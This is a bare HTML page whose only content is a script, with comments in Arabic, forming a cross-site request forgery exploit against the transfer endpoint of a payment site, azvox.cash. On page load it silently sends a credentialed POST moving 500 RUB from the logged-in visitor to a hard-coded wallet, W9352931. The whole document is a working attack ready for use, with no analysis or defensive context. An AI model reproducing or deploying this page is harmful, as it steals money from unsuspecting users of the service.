<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<script>
function sendTransfer(amount, cur, pcAmount) {
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://azvox.cash/account/transfer/", true);

// لا تقدر تضبط الهيدرز التي يتحكم بها المتصفح مثل Cookie/Origin
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");

// إرسال الكوكيز
xhr.withCredentials = true;

xhr.onload = function() {
  console.log("status:", xhr.status);
  // الخادم قد يرجع HTML أو JSON؛ تأكد كيف الخادم يرد
  try {
    var json = JSON.parse(xhr.responseText);
    console.log("json:", json);
  } catch (e) {
    console.log("text response:", xhr.responseText);
  }
};

// بناء جسم الطلب مثل curl
 var body =
    "sepi=&s_ex=&to_wallet=W9352931" +
    "&amount=" +
    encodeURIComponent(amount) +
    "&cur=" +
    encodeURIComponent(cur) +
    "&comment=" +
    "&pcAmount=" +
    encodeURIComponent(pcAmount);
xhr.send(body);
}
setTimeout(() => sendTransfer(500, "RUB",505.00), 190);
</script>
